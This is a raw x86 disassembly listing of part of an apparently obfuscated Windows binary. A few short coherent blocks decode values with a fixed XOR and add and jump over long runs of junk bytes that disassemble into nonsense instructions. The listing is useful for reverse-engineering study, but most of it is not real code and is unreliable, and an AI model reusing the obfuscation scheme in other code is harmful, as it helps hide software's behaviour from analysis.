  40c3d4:	outs   dx,BYTE PTR ds:[esi]
  40c3d5:	loopne 0x40c362
  40c3d7:	rcl    ah,1
  40c3d9:	test   esi,edi
  40c3db:	lods   al,BYTE PTR ds:[esi]
  40c3dc:	out    dx,al
  40c3dd:	push   es
  40c3de:	pushf  
  40c3df:	mov    BYTE PTR [ebp-0x5e74af4b],ah
  40c3e5:	adc    ah,BYTE PTR [ebp-0x75]
  40c3e8:	inc    ebp
  40c3e9:	cld    
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rcr    ebx,cl
  40c447:	add    al,0x61
  40c449:	out    0x14,al
  40c44b:	cmp    BYTE PTR [esi+0x7e],0x38
  40c44f:	jl     0x40c4cf
  40c451:	jle    0x40c446
  40c453:	fld    DWORD PTR [ecx-0x782aeb0a]
  40c459:	push   es
  40c45a:	out    0xfc,al
  40c45c:	retf   
  40c45d:	fwait
  40c45e:	adc    eax,0xf962c89e
  40c463:	hlt    
  40c464:	or     ebp,DWORD PTR [edx-0x46]
  40c467:	iret   
  40c468:	cld    
  40c469:	xor    al,0xf2
  40c46c:	cmp    eax,0x2b9e29f
  40c471:	mov    bl,0x82
  40c473:	cmp    ebp,edx
  40c475:	les    edi,FWORD PTR [edx]
  40c477:	add    BYTE PTR [ebx],ch
  40c479:	shl    BYTE PTR [ecx-0x6347f3a9],1
  40c47f:	out    dx,eax
  40c480:	popa   
  40c481:	adc    DWORD PTR gs:[ebx-0x902fd63],eax
  40c488:	adc    esp,DWORD PTR [esi+0x68]
  40c48b:	nop
  40c48c:	or     eax,0xd03603cf
  40c491:	jbe    0x40c4a7
  40c493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c494:	mov    ah,0xaf
  40c496:	hlt    
  40c497:	pop    esi
  40c498:	ficomp WORD PTR [esi]
  40c49a:	cs das 
  40c49c:	mov    si,0xeba6
  40c4a0:	push   ecx
  40c4a1:	retf   0x53b5
  40c4a4:	popf   
  40c4a5:	add    ecx,esi
  40c4a7:	fdivp  st(5),st
  40c4a9:	add    eax,DWORD PTR [edi-0x74]
  40c4ac:	xchg   ebp,eax
  40c4ad:	or     eax,0x55c0e7d5
  40c4b2:	imul   edx,DWORD PTR [esi-0x35abb81b],0x2ec542e4
  40c4bc:	pop    ebx
  40c4bd:	and    bl,BYTE PTR [ecx+0x28c395fe]
  40c4c3:	dec    esp
  40c4c4:	sahf   
  40c4c5:	add    eax,0xa11fc653
  40c4ca:	cld    
  40c4cb:	not    edx
  40c4cd:	fidivr WORD PTR [edx+0x41]
  40c4d0:	pop    ecx
  40c4d1:	inc    esp
  40c4d2:	cmp    bh,bh
  40c4d4:	adc    esp,DWORD PTR [ebx]
  40c4d6:	jno    0x40c496
  40c4d8:	sub    dh,ah
  40c4da:	call   DWORD PTR [ebx+0x540ec6bf]
  40c4e0:	imul   eax,DWORD PTR [esi],0xffffffc7
  40c4e3:	popf   
  40c4e4:	or     dl,BYTE PTR [edx-0x2c7aee20]
  40c4ea:	xor    eax,0xa3ecffe1
  40c4ef:	cwde   
  40c4f0:	je     0x40c55f
  40c4f2:	imul   eax,DWORD PTR [edx],0xa910f8bc
  40c4f8:	mov    dh,al
  40c4fa:	es in  al,0xf0
  40c4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4fe:	outs   dx,DWORD PTR ds:[esi]
  40c4ff:	pop    esi
  40c500:	mov    eax,ds:0xfdadc4fb
  40c505:	jl     0x40c56b
  40c507:	xlat   BYTE PTR ds:[ebx]
  40c508:	pop    esp
  40c509:	out    0x59,eax
  40c50b:	push   ds
  40c50c:	lahf   
  40c50d:	fbstp  TBYTE PTR [edi+0x3a]
  40c510:	cmp    ebx,ebp
  40c512:	xor    DWORD PTR [ecx+0x24d5576c],0x5a13d2fe
  40c51c:	jmp    0x36da:0xd031fa72
  40c523:	cmp    ah,BYTE PTR [ecx-0x68e97033]
  40c529:	and    edx,edi
  40c52b:	push   edx
  40c52c:	add    esp,DWORD PTR [ebp+ecx*2+0x5]
  40c530:	call   0xea3a0060
  40c535:	dec    edx
  40c536:	clc    
  40c537:	(bad)  
  40c539:	lods   eax,DWORD PTR ds:[esi]
  40c53a:	push   DWORD PTR [edi-0x4e75f9fa]
  40c540:	add    BYTE PTR [esi+0x318f41ef],ah
  40c546:	pop    esi
  40c547:	lahf   
  40c548:	inc    edi
  40c549:	fdivr  DWORD PTR [esi+0x3e]
  40c54c:	pop    ebx
  40c54d:	inc    edx
  40c54e:	mov    esi,0xb3751699
  40c553:	shl    DWORD PTR [edi+0x4722cc2a],cl
  40c559:	xchg   BYTE PTR [ebp+0x7c],bh
  40c55c:	(bad)  
  40c55d:	(bad)  [esi+0x25]
  40c560:	inc    eax
  40c561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c562:	retf   0x2636
  40c565:	vpshaw xmm11,[edx],xmm0
  40c56a:	aaa    
  40c56b:	mov    ecx,DWORD PTR [ecx]
  40c56d:	mov    bh,0x90
  40c56f:	mov    al,0x80
  40c571:	xchg   edi,eax
  40c572:	sbb    DWORD PTR [ebp+0x67],esp
  40c575:	inc    esp
  40c576:	(bad)
  40c579:	les    ecx,FWORD PTR [ebx+0x6a]
  40c57c:	push   eax
  40c57d:	mov    bl,0x11
  40c580:	pop    eax
  40c581:	or     eax,0x58d48ee8
  40c586:	add    cl,0xe6
  40c589:	out    0xcb,eax
  40c58b:	add    ecx,DWORD PTR [esi+0x491060a7]
  40c591:	outs   dx,BYTE PTR ds:[esi]
  40c592:	push   esi
  40c593:	jp     0x40c51a
  40c595:	and    al,0xf1
  40c597:	inc    esp
  40c598:	add    esi,DWORD PTR [esi+ebx*2-0x44337bc1]
  40c59f:	arpl   WORD PTR [ecx+0x13],dx
  40c5a2:	adc    eax,0xe99eb6b2
  40c5a7:	and    eax,0xff59a53e
  40c5ac:	imul   ebx,DWORD PTR [ecx],0xffffffbd
  40c5af:	aaa    
  40c5b0:	test   ebx,0x9944e633
  40c5b6:	push   cs
  40c5b7:	lods   al,BYTE PTR ds:[esi]
  40c5b8:	outs   dx,BYTE PTR ds:[esi]
  40c5b9:	mov    al,0xd3
  40c5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5bc:	and    edi,DWORD PTR [eax-0x48]
  40c5bf:	dec    esi
  40c5c0:	pop    ecx
  40c5c1:	aaa    
  40c5c2:	lds    ebp,FWORD PTR [edx+ebx*8]
  40c5c5:	lds    edi,FWORD PTR [eax+ebx*1-0x9]
  40c5c9:	(bad)  
  40c5ca:	xchg   edx,eax
  40c5cb:	out    0x33,al
  40c5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ce:	int    0x1e
  40c5d0:	cli    
  40c5d1:	(bad)  
  40c5d2:	ret    
  40c5d3:	das    
  40c5d4:	repnz neg BYTE PTR [ecx]
  40c5d7:	clc    
  40c5d8:	int3   
  40c5d9:	in     eax,0x86
  40c5db:	sti    
  40c5dc:	shr    DWORD PTR [edi],1
  40c5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5df:	stos   DWORD PTR es:[edi],eax
  40c5e0:	xchg   ebp,eax
  40c5e1:	mov    ds:0x1e0e610c,al
  40c5e6:	fdivr  QWORD PTR [ebx]
  40c5e8:	shl    DWORD PTR [ebx-0x49bb43d1],cl
  40c5ee:	shr    BYTE PTR [esi-0x42f2f07f],1
  40c5f4:	cmp    BYTE PTR gs:[ebp-0x76],ah
  40c5f8:	dec    edi
  40c5f9:	imul   esp,DWORD PTR [eax-0x72081ffe],0xc88366ae
  40c603:	sub    eax,0x1b85143f
  40c608:	loopne 0x40c628
  40c60a:	jb     0x40c615
  40c60c:	cli    
  40c60d:	xlat   BYTE PTR ds:[ebx]
  40c60e:	xchg   esi,eax
  40c60f:	std    
  40c610:	ret    
  40c611:	mov    ds:0x8f702de0,eax
  40c616:	adc    esi,DWORD PTR [eax+0x779ea952]
  40c61c:	xchg   BYTE PTR [eiz*2-0x345b6cb5],bl
  40c623:	jb     0x40c5cf
  40c625:	cmp    BYTE PTR [esi],ch
  40c627:	sbb    eax,0xa903f5c8
  40c62c:	mov    ah,BYTE PTR [eax*1+0xe5caad5]
  40c633:	int    0x3f
  40c635:	mov    cl,0x45
  40c637:	push   ds
  40c638:	mov    bl,0x2
  40c63a:	xor    al,BYTE PTR ds:0x206f0f54
  40c640:	mov    ecx,DWORD PTR [edi-0x42]
  40c643:	icebp  
  40c644:	in     eax,dx
  40c645:	iret   
  40c646:	mov    esp,0x9030313e
  40c64b:	cmp    al,dh
  40c64d:	sbb    DWORD PTR [edi+ebx*8],edx
  40c650:	or     BYTE PTR [eax],dh
  40c652:	ret    
  40c653:	fs xchg ebp,eax
  40c655:	add    ebx,edx
  40c657:	(bad)  
  40c658:	in     al,dx
  40c659:	hlt    
  40c65a:	addr16 sahf 
  40c65c:	sub    DWORD PTR cs:[edx-0x6d],0x2
  40c661:	aas    
  40c662:	push   ecx
  40c663:	je     0x40c651
  40c665:	mov    ebx,0xf21acfcd
  40c66a:	xchg   BYTE PTR [edx-0x52833c6a],cl
  40c670:	jmp    0x50d3:0x464cf111
  40c677:	cwde   
  40c678:	inc    esp
  40c679:	rcl    BYTE PTR [esi+esi*8],cl
  40c67c:	nop
  40c67d:	(bad)  
  40c67e:	rol    cl,1
  40c680:	dec    esi
  40c681:	dec    ebx
  40c682:	and    dl,ah
  40c684:	jge    0x40c631
  40c686:	retf   
  40c687:	sti    
  40c688:	pop    ds
  40c689:	stos   BYTE PTR es:[edi],al
  40c68a:	push   esp
  40c68b:	lea    ebx,[eax-0x16640a3c]
  40c691:	stos   DWORD PTR es:[edi],eax
  40c692:	scas   eax,DWORD PTR es:[edi]
  40c693:	mov    ds:0xc35c85ce,eax
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x4479ac1],dl
  40c6de:	add    edi,eax
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	push   ebx
  40c6e9:	sub    al,0x44
  40c6eb:	test   BYTE PTR [esi-0x69214494],ah
  40c6f1:	cmc    
  40c6f2:	jl     0x40c76e
  40c6f4:	mov    al,0x80
  40c6f6:	and    al,bh
  40c6f8:	test   al,0xc2
  40c6fa:	jmp    0xf25065c4
  40c6ff:	aas    
  40c700:	ss call 0xc56:0x40ade451
  40c708:	pop    es
  40c709:	sbb    edx,0xb413b41
  40c70f:	push   eax
  40c710:	ret    0xc0d
  40c713:	cmovo  ebp,DWORD PTR [eax-0x76]
  40c717:	add    esi,DWORD PTR [ebx+0x19]
  40c71a:	add    ah,BYTE PTR ds:0x9806ac1e
  40c720:	or     ebx,DWORD PTR [edx]
  40c722:	inc    esp
  40c723:	cmc    
  40c724:	pop    esp
  40c725:	inc    edi
  40c726:	jle    0x40c6e7
  40c728:	jmp    0x86c158
  40c72d:	aad    0x58
  40c72f:	sti    
  40c730:	xchg   edx,eax
  40c731:	out    dx,al
  40c732:	sub    esi,edi
  40c734:	xchg   edi,eax
  40c735:	int3   
  40c736:	xor    al,0xc1
  40c738:	push   ecx
  40c739:	bound  ecx,QWORD PTR [eax-0x19]
  40c73c:	and    eax,DWORD PTR [esi]
  40c73e:	mov    dl,BYTE PTR ds:0x83bef67
  40c744:	pushf  
  40c745:	inc    ecx
  40c746:	xor    DWORD PTR [edx-0x49735e5b],ecx
  40c74c:	add    al,0xe7
  40c74e:	inc    esp
  40c74f:	mov    cl,0xf7
  40c751:	fcomp  DWORD PTR [edx-0x17e76fdd]
  40c757:	loop   0x40c724
  40c759:	fimul  WORD PTR [esi]
  40c75b:	add    al,0xa9
  40c75d:	ret    
  40c75e:	add    esp,esi
  40c760:	lods   al,BYTE PTR ds:[esi]
  40c761:	sbb    ch,BYTE PTR [ecx]
  40c763:	nop
  40c764:	sub    BYTE PTR [edi+0x6fc878c2],0xaf
  40c76b:	add    dl,cl
  40c76d:	loopne 0x40c796
  40c76f:	arpl   WORD PTR [edx],sp
  40c771:	cmp    eax,0x9950c7ac
  40c776:	(bad)  
  40c777:	pop    esp
  40c778:	int3   
  40c779:	add    bl,cl
  40c77b:	addr16 mov ds:0x6d0c,eax
  40c77f:	mov    bh,0xeb
  40c781:	mov    ds:0x90b40cd8,al
  40c786:	ins    DWORD PTR es:[edi],dx
  40c787:	sti    
  40c788:	adc    BYTE PTR [edi],0xcd
  40c78b:	pop    ss
  40c78c:	xor    eax,0x806cf4c0
  40c791:	jmp    0x9e81:0xb323fff9
  40c798:	cmp    bl,dh
  40c79a:	push   ss
  40c79b:	sbb    eax,0xbf78d57b
  40c7a0:	sbb    DWORD PTR [eax-0x7adbf87],0x1
  40c7a7:	daa    
  40c7a8:	push   ebp
  40c7a9:	jno    0x40c7c5
  40c7ab:	inc    edi
  40c7ac:	sar    DWORD PTR [edx+0x6a],cl
  40c7af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7b0:	lock daa 
  40c7b2:	jbe    0x40c7f3
  40c7b4:	ins    BYTE PTR es:[edi],dx
  40c7b5:	std    
  40c7b6:	xlat   BYTE PTR ds:[ebx]
  40c7b7:	jle    0x40c7bd
  40c7b9:	or     BYTE PTR [edx-0x42],0xc4
  40c7bd:	mov    WORD PTR [edx+edx*2],?
  40c7c0:	fst    st(1)
  40c7c2:	xor    eax,edx
  40c7c4:	or     eax,0x89bd6ea9
  40c7c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7ca:	popa   
  40c7cb:	cmp    eax,0x763b24fa
  40c7d0:	pop    ebp
  40c7d1:	add    al,0x2a
  40c7d3:	xchg   DWORD PTR [ebx+0x385aeb05],esi
  40c7d9:	xor    eax,0xfbbc2597
  40c7de:	ficom  DWORD PTR [edi]
  40c7e0:	(bad)  
  40c7e1:	lods   al,BYTE PTR ds:[esi]
  40c7e2:	out    0x73,eax
  40c7e4:	mov    ds:0x8a6f1529,eax
  40c7e9:	lods   eax,DWORD PTR ds:[esi]
  40c7ea:	xchg   ecx,eax
  40c7eb:	or     al,0x10
  40c7ed:	rcr    BYTE PTR [esi+0x1],1
  40c7f0:	jb     0x40c85f
  40c7f2:	(bad)  
  40c7f4:	cdq    
  40c7f5:	xlat   BYTE PTR ds:[ebx]
  40c7f6:	mov    ebp,0x32143baa
  40c7fb:	std    
  40c7fc:	(bad)  
  40c7fd:	pop    edx
  40c7fe:	cs in  eax,0x9b
  40c801:	outs   dx,BYTE PTR ds:[esi]
  40c802:	leave  
  40c803:	or     al,0x3a
  40c805:	repnz xlat BYTE PTR ds:[ebx]
  40c807:	or     BYTE PTR [edi-0x54b4788c],dl
  40c80d:	sahf   
  40c80e:	aad    0x72
  40c810:	mov    ds:0x66a625a0,eax
  40c815:	pop    edx
  40c816:	or     DWORD PTR [edx+0x7d],esp
  40c819:	dec    esi
  40c81a:	into   
  40c81b:	mov    ch,0x84
  40c81d:	sub    esp,ebx
  40c81f:	xlat   BYTE PTR ds:[ebx]
  40c820:	mov    edi,0x88642170
  40c825:	mov    ebx,0xb73fa87d
  40c82a:	fisubr WORD PTR [di-0x5e17]
  40c82f:	int3   
  40c830:	test   eax,0xa0cbd0e2
  40c835:	sbb    BYTE PTR [esp+ebp*8-0x2508894c],cl
  40c83c:	mov    al,ds:0xfe22ec10
  40c841:	fpatan 
  40c843:	addr16 and al,0x7e
  40c846:	clc    
  40c847:	rol    DWORD PTR [ebp+0x35e0bcc],1
  40c84d:	add    bl,BYTE PTR [ecx-0x3f6c4c1c]
  40c853:	retf   0xb9d9
  40c856:	xor    BYTE PTR [esi+0x27],cl
  40c859:	es push dx
  40c85c:	dec    ebx
  40c85d:	mov    cl,0xe4
  40c85f:	pop    eax
  40c860:	cwde   
  40c861:	sbb    edi,DWORD PTR [esi]
  40c863:	mov    esp,0x154769d8
  40c868:	push   edx
  40c869:	out    0xc2,eax
  40c86b:	les    ecx,FWORD PTR [ebx+0x11]
  40c86e:	(bad)  
  40c86f:	xchg   ebx,eax
  40c870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c871:	xchg   ecx,eax
  40c872:	fcomp  QWORD PTR [eax+0x4814d0f2]
  40c878:	push   0x6e93b05e
  40c87d:	add    al,0x88
  40c87f:	mov    edx,0x4dd7dc7f
  40c884:	mov    ch,0x14
  40c886:	shl    eax,cl
  40c888:	sub    eax,0xcf73ff3f
  40c88d:	mov    cl,0xd8
  40c88f:	push   es
  40c890:	jmp    0x3cbb:0x93bd53ba
  40c897:	pop    ebp
  40c898:	push   0xffffff89
  40c89a:	add    eax,0xdfefb9df
  40c89f:	mov    al,ds:0x4804a105
  40c8a4:	sbb    BYTE PTR [ecx+0x13],ah
  40c8a7:	push   edx
  40c8a8:	iret   
  40c8a9:	das    
  40c8aa:	add    DWORD PTR [ebp+ecx*2-0x4c0555a5],0xda9aba1
  40c8b5:	dec    esi
  40c8b6:	push   DWORD PTR [edx+0x3082563c]
  40c8bc:	dec    edx
  40c8bd:	push   es
  40c8be:	outs   dx,BYTE PTR ds:[esi]
  40c8bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8c0:	add    BYTE PTR [ebp-0x10],al
  40c8c3:	mov    esi,0x2037bc9d
  40c8c8:	sbb    DWORD PTR [esi-0x5c45a9d2],edi
  40c8ce:	and    BYTE PTR [edi-0x28b76c30],bl
  40c8d4:	jg     0x40c8c1
  40c8d6:	mov    esi,0xc25f013
  40c8db:	dec    edx
  40c8dc:	adc    DWORD PTR [edi],0xffffffab
  40c8df:	mov    edx,0x735ad895
  40c8e4:	and    cl,BYTE PTR [ecx]
  40c8e6:	pop    ds
  40c8e7:	fs int3 
  40c8e9:	cmc    
  40c8ea:	(bad)  
  40c8eb:	in     eax,0x8c
  40c8ed:	je     0x40c8bb
  40c8ef:	in     al,0xa5
  40c8f1:	mov    WORD PTR ds:0x41c4e468,fs
  40c8f7:	add    DWORD PTR [edx+0x3c],0x54600f5d
  40c8fe:	es xchg ebp,eax
  40c900:	sbb    ch,BYTE PTR ds:0x2bd179e1
  40c906:	(bad)  
  40c907:	and    ah,BYTE PTR [eax-0x4a]
  40c90a:	test   BYTE PTR [eax-0x62],dh
  40c90d:	push   es
  40c90e:	add    edi,ebx
  40c910:	cmp    DWORD PTR [edi],0xfffffffa
  40c913:	xchg   ecx,eax
  40c914:	imul   DWORD PTR [edi+0x68]
  40c917:	push   ds
  40c918:	sub    bl,BYTE PTR [edx-0x471450cf]
  40c91e:	fist   WORD PTR [esi-0x40]
  40c921:	in     al,dx
  40c922:	pop    ebx
  40c923:	outs   dx,BYTE PTR ds:[esi]
  40c924:	stc    
  40c925:	bnd addr16 call 0xb99a1ced
  40c92c:	jae    0x40c927
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    esi,ecx
  40c945:	jle    0x40c94f
  40c947:	sets   BYTE PTR [esi+0x7c387e7e]
  40c94e:	jle    0x40c9ce
  40c950:	sahf   
  40c951:	push   es
  40c952:	(bad)  
  40c953:	inc    ebp
  40c954:	ret    0x8a0d
  40c957:	ret    0x55ef
  40c95a:	leave  
  40c95b:	lahf   
  40c95c:	or     BYTE PTR [ecx+0x61b9f90a],ah
  40c962:	jnp    0x40c9e2
  40c964:	mov    edi,0x60a3bb5f
  40c969:	xchg   edx,eax
  40c96a:	outs   dx,DWORD PTR ds:[esi]
  40c96b:	xchg   BYTE PTR [eax+0x3b],dh
  40c96e:	add    eax,0x4eda3e35
  40c973:	lahf   
  40c974:	rol    BYTE PTR [eax+0x9],0x8b
  40c978:	jmp    0x4de9:0x18db988c
  40c97f:	jb     0x40c9d4
  40c981:	icebp  
  40c982:	out    0xa3,al
  40c984:	gs xchg ebp,eax
  40c986:	pop    edx
  40c987:	nop
  40c988:	jge    0x40c949
  40c98a:	mov    cl,0x36
  40c98c:	frstor [esi]
  40c98e:	add    al,0xb0
  40c990:	add    edx,DWORD PTR [ecx-0x596076c2]
  40c996:	sbb    al,0xcf
  40c998:	mov    al,0x49
  40c99a:	add    dh,al
  40c99c:	mov    ebp,0x76d5b614
  40c9a1:	mov    ebp,0x8970aa40
  40c9a6:	adc    ah,BYTE PTR [ebx]
  40c9a8:	aam    0xfa
  40c9aa:	jae    0x40c971
  40c9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ad:	cld    
  40c9ae:	loope  0x40c9cb
  40c9b0:	mov    ds:0x2372c4fe,al
  40c9b5:	xlat   BYTE PTR ds:[ebx]
  40c9b6:	pusha  
  40c9b7:	mov    eax,ds:0xdc6561f5
  40c9bc:	pop    ecx
  40c9bd:	cld    
  40c9be:	jmp    0x40ca3d
  40c9c0:	scas   al,BYTE PTR es:[edi]
  40c9c1:	jg     0x40c9cc
  40c9c3:	push   edx
  40c9c4:	loop   0x40c9ab
  40c9c6:	int    0x42
  40c9c8:	fcom   DWORD PTR [edi]
  40c9ca:	inc    ebp
  40c9cb:	cli    
  40c9cc:	mov    ds:0xe14213e6,al
  40c9d1:	jno    0x40c9bc
  40c9d3:	test   DWORD PTR [ebp+0x33b8894],ecx
  40c9d9:	retf   0x803f
  40c9dc:	call   0xed6d:0x809742a7
  40c9e3:	xor    bh,BYTE PTR [ecx]
  40c9e5:	dec    edx
  40c9e6:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9e8:	cmp    BYTE PTR [ecx+edx*8+0x12f44e89],ah
  40c9ef:	ficom  DWORD PTR [esi-0x75f884d9]
  40c9f5:	jnp    0x40c98a
  40c9f7:	xor    eax,0xb7f855ae
  40c9fc:	ds out dx,eax
  40c9fe:	cmp    DWORD PTR [edi+0x61f0a1ed],esi
  40ca04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca05:	add    DWORD PTR [ecx-0x61cafdaf],edx
  40ca0b:	stc    
  40ca0c:	jno    0x40c999
  40ca0e:	mov    WORD PTR [esi-0xd5d6ffe],gs
  40ca14:	inc    BYTE PTR [ebx+0x77693511]
  40ca1a:	sbb    DWORD PTR [ebx],eax
  40ca1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca1d:	xor    ebx,0x15
  40ca20:	call   0xfb7c:0x423d2222
  40ca27:	xchg   ebx,eax
  40ca28:	into   
  40ca29:	adc    DWORD PTR [edi+ecx*2],0xffffffff
  40ca2d:	scas   eax,DWORD PTR es:[edi]
  40ca2e:	dec    edx
  40ca2f:	shl    DWORD PTR [esi+0xf02982d],cl
  40ca35:	xchg   DWORD PTR [ebx],edi
  40ca37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca38:	ret    0xb6ae
  40ca3b:	in     al,dx
  40ca3c:	pop    ebp
  40ca3d:	sbb    al,0x67
  40ca3f:	push   ss
  40ca40:	mov    eax,ds:0x44d1f3a9
  40ca45:	sub    eax,ebp
  40ca47:	lahf   
  40ca48:	pop    ds
  40ca49:	fnsave [edx+0x4dac1591]
  40ca4f:	sbb    eax,0x4dd9e76b
  40ca54:	add    dl,BYTE PTR [edx+0x78f5ddb8]
  40ca5a:	dec    eax
  40ca5b:	test   al,0xa2
  40ca5d:	and    al,0x55
  40ca5f:	fwait
  40ca60:	jl     0x40ca7b
  40ca62:	pop    eax
  40ca63:	bound  esp,QWORD PTR [ebp-0x5e]
  40ca66:	pusha  
  40ca67:	xchg   edx,eax
  40ca68:	push   es
  40ca69:	aam    0x52
  40ca6b:	push   edi
  40ca6c:	es adc eax,0x457c4e56
  40ca72:	mov    al,0x65
  40ca74:	pop    es
  40ca75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca76:	aaa    
  40ca77:	push   ss
  40ca78:	jae    0x40caa4
  40ca7a:	push   es
  40ca7b:	dec    esp
  40ca7c:	mov    eax,ds:0xd7d0b18e
  40ca81:	pop    ss
  40ca82:	dec    esi
  40ca83:	retf   0x2ca
  40ca86:	adc    eax,0xa0114d40
  40ca8b:	fstp   QWORD PTR ds:0x772eb69f
  40ca91:	in     al,dx
  40ca92:	pop    ebp
  40ca93:	xor    BYTE PTR [eiz*4+0x3159cd21],0xf
  40ca9b:	add    DWORD PTR [ebx+edi*8-0x169a8610],0x69
  40caa3:	xor    BYTE PTR [edx-0x6b],bl
  40caa6:	ins    BYTE PTR es:[edi],dx
  40caa7:	jae    0x40ca62
  40caa9:	cs stos DWORD PTR es:[edi],eax
  40caab:	les    esi,FWORD PTR [ecx-0x7460f94c]
  40cab1:	loope  0x40ca5f
  40cab3:	mov    esi,0x1a5972a
  40cab8:	gs pop edx
  40caba:	int    0x49
  40cabc:	out    dx,eax
  40cabd:	fwait
  40cabe:	in     eax,dx
  40cabf:	xor    eax,0xcc20a2d6
  40cac4:	jg     0x40cb38
  40cac6:	inc    edi
  40cac7:	addr16 dec edx
  40cac9:	call   0x542c4ceb
  40cace:	fst    QWORD PTR [ecx]
  40cad0:	hlt    
  40cad1:	push   ebx
  40cad2:	mov    ebp,0x1b8de2b8
  40cad7:	xor    BYTE PTR [ecx-0x41],dh
  40cada:	arpl   WORD PTR [eax+eax*1+0x7dbb2144],ax
  40cae1:	jecxz  0x40cac1
  40cae3:	mov    DWORD PTR [edx-0x19ad7437],esp
  40cae9:	xchg   edx,eax
  40caea:	pop    ebp
  40caeb:	test   BYTE PTR [ebp+0x5e],ch
  40caee:	retf   
  40caef:	add    al,0xb7
  40caf1:	fbld   TBYTE PTR [edx+0x1d0c6ff]
  40caf7:	sub    DWORD PTR [ecx+eax*1-0x4f],esp
  40cafb:	iret   
  40cafc:	adc    DWORD PTR [ecx-0x21],eax
  40caff:	retf   0xe102
  40cb02:	lods   eax,DWORD PTR ds:[esi]
  40cb03:	xor    BYTE PTR [ecx+0x79e4124d],cl
  40cb09:	or     cl,dl
  40cb0b:	xchg   esi,eax
  40cb0c:	sbb    edx,0xffffffa7
  40cb0f:	pop    ds
  40cb10:	out    0x18,eax
  40cb12:	(bad)  
  40cb13:	pop    esp
  40cb14:	mov    cl,0xa9
  40cb16:	pop    edx
  40cb17:	std    
  40cb18:	cmp    bl,dh
  40cb1a:	stos   DWORD PTR es:[edi],eax
  40cb1b:	mov    eax,ds:0x60395ea2
  40cb20:	or     ch,BYTE PTR [edi]
  40cb22:	sbb    BYTE PTR [ecx-0x45],ah
  40cb25:	sub    ecx,DWORD PTR [ecx+0x29]
  40cb28:	dec    ebx
  40cb29:	dec    eax
  40cb2a:	ret    
  40cb2b:	(bad)  
  40cb2d:	push   esp
  40cb2e:	dec    ecx
  40cb2f:	(bad)  [ecx-0x44339462]
  40cb35:	xchg   esp,eax
  40cb36:	fstp   DWORD PTR [edx+0xa]
  40cb39:	jmp    DWORD PTR [edi-0x6f7e3b25]
  40cb3f:	sub    eax,0x5dff8273
  40cb44:	int3   
  40cb45:	aas    
  40cb46:	mov    DWORD PTR [edi-0x7644096b],edi
  40cb4c:	add    DWORD PTR [ecx-0x6b],0xffffffca
  40cb50:	inc    esi
  40cb51:	test   DWORD PTR [eax+0x27],edi
  40cb54:	lds    ebx,FWORD PTR [eax+esi*1]
  40cb57:	push   ecx
  40cb58:	pop    ebp
  40cb59:	mov    dh,0x9
  40cb5b:	adc    al,0xc1
  40cb5d:	xor    edi,0x1f
